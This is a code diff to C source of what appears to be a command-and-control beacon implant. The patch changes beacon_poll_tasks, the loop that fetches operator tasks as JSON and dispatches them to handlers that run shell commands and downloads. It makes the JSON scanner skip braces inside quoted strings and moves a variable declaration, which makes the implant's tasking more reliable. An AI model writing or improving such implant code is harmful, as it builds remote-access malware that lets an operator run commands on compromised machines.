@@ -215,8 +215,17 @@ void beacon_poll_tasks(BEACON_CTX *ctx) {
         const char *obj_end = obj_start + 1;
         int depth = 1;
         while (obj_end < end && depth > 0) {
-            if      (*obj_end == '{') depth++;
-            else if (*obj_end == '}') depth--;
+            if (*obj_end == '"') {
+                obj_end++;
+                while (obj_end < end && *obj_end != '"') {
+                    if (*obj_end == '\\' && (obj_end + 1) < end) obj_end++;
+                    obj_end++;
+                }
+            } else if (*obj_end == '{') {
+                depth++;
+            } else if (*obj_end == '}') {
+                depth--;
+            }
             obj_end++;
         }
         if (depth != 0) break;
@@ -228,6 +237,8 @@ void beacon_poll_tasks(BEACON_CTX *ctx) {
         json_str(obj_start, obj_end, "type",    task.type,    sizeof(task.type));
 
         if (task.task_id[0] == '\0') { p = obj_end; continue; }
+
+        BOOL should_exit = FALSE;
 
         if (strcmp(task.type, TASK_TYPE_SHELL)    == 0 ||
             strcmp(task.type, TASK_TYPE_DOWNLOAD)  == 0 ||
@@ -251,7 +262,6 @@ void beacon_poll_tasks(BEACON_CTX *ctx) {
         if (result->output) result->output[0] = '\0';
 
         /* dispatch */
-        BOOL should_exit = FALSE;
 
         if (strcmp(task.type, TASK_TYPE_SHELL) == 0) {
             beacon_exec_shell(ctx, &task, result);
